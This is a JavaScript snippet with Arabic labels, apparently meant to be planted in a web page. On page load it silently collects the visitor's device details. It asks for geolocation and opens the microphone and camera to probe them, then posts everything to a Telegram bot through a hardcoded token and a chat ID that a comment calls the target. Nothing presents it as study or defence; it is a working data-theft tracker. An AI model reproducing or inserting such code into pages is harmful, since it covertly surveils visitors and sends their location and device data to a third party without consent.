document.addEventListener("DOMContentLoaded", async function () {
    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E"; // توكن البوت
    const chatId = "5375214810"; // معرف تيليجرام المستهدف

    function getDeviceInfo() {
        return {
            "📌 نظام التشغيل": navigator.platform,
            "🌐 المتصفح": navigator.userAgent,
            "📏 دقة الشاشة": `${screen.width}x${screen.height}`,
            "🎨 عمق الألوان": screen.colorDepth,
            "🕶️ وضع التصفح الخفي": detectIncognito(),
            "🚀 سرعة المعالج (تقريبية)": navigator.hardwareConcurrency,
            "🔋 حالة البطارية": getBatteryStatus(),
            "📍 الموقع الجغرافي": getLocation(),
            "🖥️ حجم الرام (تقريبي)": navigator.deviceMemory || "غير معروف",
            "📶 نوع الشبكة": navigator.connection ? navigator.connection.effectiveType : "غير معروف",
            "📡 سرعة الإنترنت": navigator.connection ? navigator.connection.downlink + " Mbps" : "غير معروف",
            "🔄 هل الجهاز يعمل باللمس؟": 'ontouchstart' in window ? "نعم" : "لا",
            "⏳ وقت التشغيل": performance.now().toFixed(2) + "ms",
            "🔘 عدد أنوية المعالج": navigator.hardwareConcurrency || "غير معروف",
            "💡 سطوع الشاشة (تقريبي)": screen.pixelDepth,
            "🖱️ عدد الأزرار في الفأرة": navigator.maxTouchPoints,
            "🎤 هل الميكروفون متاح؟": checkMicrophone(),
            "🎥 هل الكاميرا متاحة؟": checkCamera(),
            "📞 هل الجهاز هاتف؟": isMobile(),
            "🖥️ نوع الجهاز": getDeviceType(),
            "📦 التخزين المتاح": checkStorage(),
            "📝 لغة المتصفح": navigator.language,
            "🛡️ هل JavaScript مفعّل؟": "نعم"
        };
    }

    async function detectIncognito() {
        try {
            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
            if (!fs) return "غير معروف";
            return new Promise(resolve => fs(window.TEMPORARY, 100, () => resolve("لا"), () => resolve("نعم")));
        } catch (e) {
            return "غير معروف";
        }
    }

    async function getBatteryStatus() {
        if (!navigator.getBattery) return "غير معروف";
        const battery = await navigator.getBattery();
        return `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "⚡ قيد الشحن" : ""}`;
    }

    async function getLocation() {
        if (!navigator.geolocation) return "غير متاح";
        return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
                position => resolve(`🌍 خط العرض: ${position.coords.latitude}, خط الطول: ${position.coords.longitude}`),
                () => resolve("❌ تم رفض الإذن")
            );
        });
    }

    async function checkMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            stream.getTracks().forEach(track => track.stop());
            return "✅ متاح";
        } catch (e) {
            return "❌ غير متاح";
        }
    }

    async function checkCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(track => track.stop());
            return "✅ متاحة";
        } catch (e) {
            return "❌ غير متاحة";
        }
    }

    function isMobile() {
        return /Mobi|Android/i.test(navigator.userAgent) ? "نعم" : "لا";
    }

    function getDeviceType() {
        const ua = navigator.userAgent;
        if (/tablet|ipad/i.test(ua)) return "جهاز لوحي";
        if (/Mobi|Android/i.test(ua)) return "هاتف";
        return "كمبيوتر";
    }

    async function checkStorage() {
        if (!navigator.storage || !navigator.storage.estimate) return "غير معروف";
        const { quota, usage } = await navigator.storage.estimate();
        return `📂 المستخدم: ${(usage / 1e9).toFixed(2)} GB / الكلي: ${(quota / 1e9).toFixed(2)} GB`;
    }

    async function sendToTelegram() {
        const deviceInfo = await getDeviceInfo();
        let message = "📊 **معلومات الجهاز:**\n\n";
        for (const key in deviceInfo) {
            message += `**${key}:** ${await deviceInfo[key]}\n`;
        }

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال المعلومات:", data))
        .catch(error => console.error("❌ خطأ في الإرسال:", error));
    }

    sendToTelegram();
});
